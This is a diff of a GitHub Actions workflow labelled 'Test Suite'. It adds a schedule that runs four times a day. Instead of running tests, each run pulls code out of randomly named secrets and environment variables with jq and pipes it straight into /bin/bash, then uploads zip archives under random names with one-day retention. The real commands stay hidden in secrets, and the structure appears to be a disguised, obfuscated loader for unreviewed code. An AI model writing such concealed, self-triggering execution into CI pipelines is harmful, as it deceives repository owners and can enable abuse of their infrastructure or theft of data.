@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,16 +18,16 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          jq32071: ${{ secrets.jq32071 }}
+          dl9: ${{ secrets.dl9 }}
         run: |
-          printf '%s' "$jq32071" | jq -r .ob32 | /bin/bash
-          printf '%s' "$yh43" | jq -r .f27 | /bin/bash
-          printf '%s' "$dmao520" | jq -r .cqw2 | /bin/bash
+          printf '%s' "$dl9" | jq -r .e042 | /bin/bash
+          echo $que058 | jq -r .gjzvr9 | /bin/bash
+          printf '%s' "$zppnz49580" | jq -r .k987 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: eKFftpjr
+          name: YZz0KJRh
           path: "*.zip"
           retention-days: 1
